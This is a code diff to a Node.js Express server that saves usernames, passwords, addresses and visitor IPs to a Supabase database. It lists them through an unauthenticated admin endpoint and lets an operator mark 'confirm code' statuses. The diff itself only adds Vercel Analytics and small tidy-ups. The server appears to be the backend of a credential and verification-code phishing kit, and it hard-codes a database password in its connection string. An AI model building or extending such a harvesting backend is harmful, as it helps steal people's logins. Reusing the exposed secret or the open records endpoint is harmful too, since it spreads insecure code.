@@ -1,18 +1,19 @@
 const express = require('express');
 const path = require('path');
 const { Pool } = require('pg');
+const { inject } = require('@vercel/analytics');   // ← Added for Analytics
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// === YOUR SUPABASE CONNECTION ===
+// Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
 
-// Create table if not exists
+// Create Table
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -33,7 +34,6 @@ function getRealIP(req) {
 
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    
     try {
         await pool.query(
             "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
@@ -70,7 +70,6 @@ app.get('/api/records', async (req, res) => {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
         res.json(result.rows);
     } catch (err) {
-        console.error("Query Error:", err.message);
         res.json([]);
     }
 });
@@ -82,10 +81,7 @@ app.get('/admin', (req, res) => {
 app.post('/api/confirm-code', async (req, res) => {
     const { id, status } = req.body;
     try {
-        await pool.query(
-            "UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2",
-            [status, id]
-        );
+        await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ success: false });
@@ -100,4 +96,5 @@ app.post('/api/clear', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    inject();        // ← Enable Vercel Analytics
 });
